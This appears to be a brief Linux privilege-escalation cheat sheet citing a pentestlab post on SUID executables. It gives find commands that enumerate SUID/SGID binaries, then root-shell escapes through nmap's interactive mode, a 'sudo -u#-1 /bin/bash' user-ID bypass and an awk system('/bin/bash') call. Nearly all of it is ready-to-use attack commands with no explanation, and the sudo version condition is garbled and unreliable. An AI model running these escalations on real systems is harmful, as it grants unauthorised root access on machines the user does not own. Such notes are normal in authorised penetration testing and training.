https://pentestlab.blog/2017/09/25/suid-executables/

- Nmap
- Vim
- find
- Bash
- More
- Less
- Nano
- cp


    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -perm -u=s 2>/dev/null
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;

# nmap

For version 2.02 to 5.21

    nmap -V
    nmap --interactive
    !sh

# Sudo
Check version

    sudo --version

If sudo version < 1.28

    sudo -u#-1 /bin/bash

# awk

If awk has sudo permission

    sudo -l
    sudo awk 'BEGIN {system("/bin/bash")}'